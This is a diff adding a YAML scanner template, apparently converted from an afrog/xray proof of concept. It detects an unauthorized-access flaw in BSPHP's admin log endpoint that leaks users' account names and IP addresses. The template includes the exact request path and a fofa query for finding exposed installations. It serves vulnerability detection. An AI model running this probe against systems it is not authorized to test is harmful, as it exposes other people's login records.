@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"user":'
+          - '"ip":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘'
+id: bsphp-nauthorized-access
+info:
+  author: daffainfo
+  description: |-
+    BSPHP 存在未授权访问 泄露用户IP和账户名信息
+    fofa: "BSPHP"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: medium
+  name: BSPHP index.php 未授权访问信息泄露漏洞
+  severity: medium
+  tags: bsphp,nauthorizedaccess,informationleak,argus-import
